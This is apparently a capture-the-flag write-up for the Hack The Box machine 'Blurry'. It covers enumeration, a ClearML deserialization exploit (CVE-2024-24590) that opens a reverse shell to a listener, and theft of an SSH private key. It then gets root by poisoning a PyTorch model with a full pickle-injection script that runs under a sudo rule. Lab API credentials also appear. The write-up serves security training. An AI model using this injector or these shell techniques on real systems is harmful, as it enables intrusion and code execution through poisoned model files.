# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry]
└─$ nmap -sC -sV -Pn 10.10.11.19 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 18:01 UTC
Nmap scan report for 10.10.11.19
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.66 seconds
```

Add `app.blurry.htb`and `blurry.htb` to our `/etc/hosts`

# Page check
**app.blurry.htb**
![](images/Pasted%20image%2020250726182123.png)
We can use `default user` to login to dashboard
![](images/Pasted%20image%2020250726182224.png)

After simply enumerating and checking this page, I did not find anything useful here.

I guess there will be other services in the other sub-domain here
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry]
└─$ ffuf -u http://blurry.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.blurry.htb" -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blurry.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 463ms]
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 463ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 457ms]
api
```

Let's add `files.blurry.htb` and `chat.blurry.htb, api.blurry.htb` to our `/etc/hosts`

**files.blurry.htb**
![](images/Pasted%20image%2020250726182726.png)
Very clean page

**chat.blurry.htb**
![](images/Pasted%20image%2020250726182830.png)
Let's create an account to login to dashboard
![](images/Pasted%20image%2020250726182931.png)
We can also read the general channels
![](images/Pasted%20image%2020250726183044.png)

# CVE-2024-24590
By searching we have get the names or versions of services
I found the vulnerable target `ClearML`
![](images/Pasted%20image%2020250726183438.png)

`Deserialization` of `untrusted` data can occur in versions 0.17.0 to 1.14.2 of the client SDK of Allegro AI’s `ClearML` platform, enabling a maliciously uploaded artifact to run arbitrary code on an end user’s system when interacted with.

There is a detailed blog to explain the attacking chain
```
https://hiddenlayer.com/innovation-hub/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
```

Let's exploit it step by step:
Clicking the “+” button on the Experiments page loads this window:
![](images/Pasted%20image%2020250726184340.png)

Then press the `create new credentials`, we can get the `clearml` configuration information
```
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "0JDSSUIV5202MUAKWNE2"
    "secret_key" = "kkVAPM6745gMIfkHz8v4nO6eSNHqELCLj2K4HvZLMPVuS39mdP"
  }
}
```

So let's follow up the hints
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry]
└─$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "0JDSSUIV5202MUAKWNE2"
    "secret_key" = "kkVAPM6745gMIfkHz8v4nO6eSNHqELCLj2K4HvZLMPVuS39mdP"
  }
}
Detected credentials key="0JDSSUIV5202MUAKWNE2" secret="kkVA***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/wither/clearml.conf
ClearML setup completed successfully.

```

Here I would use other's poc script here
`https://github.com/j3r1ch0123/CVE-2024-24590.git`

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry/CVE-2024-24590]
└─$ python3 exp.py   
ClearML Task: overwriting (reusing) task id=9323ff7a7dfc48b69e363f25592a35a7
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/9323ff7a7dfc48b69e363f25592a35a7/output/log
Enter your IP address: ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
10.10.14.5
Enter the port you're listening on: 443
Artifact uploaded...
Check your listener in about a minute...
                          \\

┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry]
└─$ nc -lnvp 443   
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.19] 37824
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Then we can upgrade our shell
```
jippity@blurry:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
jippity@blurry:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
jippity@blurry:~$

```

There is also the `id_rsa` for us to use ssh to connect it 
```
jippity@blurry:~$ ls -al
total 60
drwxr-xr-x 6 jippity jippity  4096 May 30  2024 .
drwxr-xr-x 3 root    root     4096 Feb  6  2024 ..
drwxr-xr-x 2 jippity jippity  4096 Feb 17  2024 automation
lrwxrwxrwx 1 root    root        9 Feb 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 jippity jippity   220 Feb  6  2024 .bash_logout
-rw-r--r-- 1 jippity jippity  3570 Feb  6  2024 .bashrc
drwxr-xr-x 9 jippity jippity  4096 Feb  8  2024 .clearml
-rw-r--r-- 1 jippity jippity 11007 Feb 17  2024 clearml.conf
-rw-r--r-- 1 jippity jippity    29 Feb  6  2024 .clearml_data.json
-rw-r--r-- 1 jippity jippity    22 Feb  8  2024 .gitconfig
drwx------ 5 jippity jippity  4096 Feb  6  2024 .local
-rw-r--r-- 1 jippity jippity   807 Feb  6  2024 .profile
lrwxrwxrwx 1 root    root        9 Feb 17  2024 .python_history -> /dev/null
drwx------ 2 jippity jippity  4096 Feb 17  2024 .ssh
-rw-r----- 1 root    jippity    33 Jul 26 04:23 user.txt
jippity@blurry:~$ cd .ssh
jippity@blurry:~/.ssh$ ls -al
total 20
drwx------ 2 jippity jippity 4096 Feb 17  2024 .
drwxr-xr-x 6 jippity jippity 4096 May 30  2024 ..
-rw-r--r-- 1 jippity jippity  568 Feb 17  2024 authorized_keys
-rw------- 1 jippity jippity 2602 Feb 14  2024 id_rsa
-rw-r--r-- 1 jippity jippity  568 Feb 14  2024 id_rsa.pub

```
Then we can connect it by ssh
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Blurry/CVE-2024-24590]
└─$ ssh -i id_rsa jippity@blurry.htb                 
The authenticity of host 'blurry.htb (10.10.11.19)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blurry.htb' (ED25519) to the list of known hosts.
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug  1 11:37:37 2024 from 10.10.14.40
jippity@blurry:~$ 

```

# Privilege Escalation
Firstly, I would like check `sudo -l`
```
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth

```

We can read the source code of this script
```
jippity@blurry:~$ cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi

```

I will explain this script shortly
```
This script, /usr/bin/evaluate_model, is used to safely evaluate a PyTorch model file (.pth) against a proprietary dataset. Here's what it does, step by step:

Input Check: It expects one argument — the path to the model file.

File Type Detection: Determines whether the file is a .tar (older format) or .zip (newer format) archive.

Extraction: Unpacks the archive to a temporary directory (/opt/temp).

Security Scan: Searches for pickle files (*.pkl), then scans them using fickling to detect malicious code.

Quarantine: If anything malicious is detected, it deletes the model file.

Cleanup: Deletes all extracted files and the temporary directory.

Execution: If the model is safe, it runs /models/evaluate_model.py on the file.
```

So let's check `/model`, check can we write or change
```
jippity@blurry:~$ ls -al /models
total 1068
drwxrwxr-x  2 root jippity    4096 Aug  1  2024 .
drwxr-xr-x 19 root root       4096 Jun  3  2024 ..
-rw-r--r--  1 root root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root root       2547 May 30  2024 evaluate_model.py
```

Let's download them to check what can we exploit:
This blog has show us how to exploit one model
```
https://hiddenlayer.com/innovation-hub/weaponizing-machine-learning-models-with-ransomware/
```

Pickle Code Injection `PoC`
To weaponize the main pickle file within an existing` pre-trained PyTorch model,` we have developed the following example code. It injects the model’s `data.pkl `file with an instruction to execute arbitrary code by using either `os.system`, exec, eval, or the lesser-known `runpy._run_code` method:
**torch_picke_inject.py**
```
import os
import argparse
import pickle
import struct
import shutil
from pathlib import Path

import torch

class PickleInject():
    """Pickle injection. Pretends to be a "module" to work with torch."""
    def __init__(self, inj_objs, first=True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Reimplementation of Pickler with support for injection"""
        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)

            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            """Pickle data, inject object before or after"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            # Pickle user-supplied data
            self.save(obj)

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def Pickler(self, file, protocol):
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject():
        """Base class for pickling injected commands"""
        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        """Create os.system command"""
        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        """Create exec command"""
        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        """Create eval command"""
        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        """Create runpy command"""
        def __init__(self, args):
            import runpy
            super().__init__(args, command=runpy._run_code)

        def __reduce__(self):
            return self.command, (self.args,{})

parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
parser.add_argument("model", type=Path)
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
parser.add_argument("args")
parser.add_argument("-v", "--verbose", help="verbose logging", action="count")

args = parser.parse_args()

command_args = args.args

# If the command arg is a path, read the file contents
if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

# Construct payload
if args.command == "system":
    payload = PickleInject.System(command_args)
elif args.command == "exec":
    payload = PickleInject.Exec(command_args)
elif args.command == "eval":
    payload = PickleInject.Eval(command_args)
elif args.command == "runpy":
    payload = PickleInject.RunPy(command_args)

# Backup the model
backup_path = "{}.bak".format(args.model)
shutil.copyfile(args.model, backup_path)

# Save the model with the injected payload
torch.save(torch.load(args.model), f=args.model, pickle_module=PickleInject([payload]))
```

So let's exploit it
```
jippity@blurry:/tmp$ python3 torch_pickle_inject.py evil.pth runpy "import os; os.system('id')"

jippity@blurry:/models$ cp /tmp/evil.pth ./

jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/evil.pth 
[+] Model /models/evil.pth is considered safe. Processing...
uid=0(root) gid=0(root) groups=0(root)
[+] Loaded Model.
[+] Dataloader ready. Evaluating model...
[+] Accuracy of the model on the test dataset: 59.38%

```

We can also try to get the bash 
```
jippity@blurry:/models$ cp demo_model.pth /tmp
jippity@blurry:/models$ mv /tmp/demo_model.pth /tmp/shell.pth
jippity@blurry:/models$ python3 /tmp/torch_pickle_inject.py /tmp/shell.pth system "bash"
jippity@blurry:/models$ cp /tmp/shell.pth ./
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/shell.pth 
[+] Model /models/shell.pth is considered safe. Processing...
root@blurry:/models# whoami
root
root@blurry:/models# 

```

# Description

The CVE exploitation of the footprint is relatively complex, and mainly requires reading the POC document.
For root, its cleanup script runs too frequently, and it needs to be completed as soon as possible when exploiting it.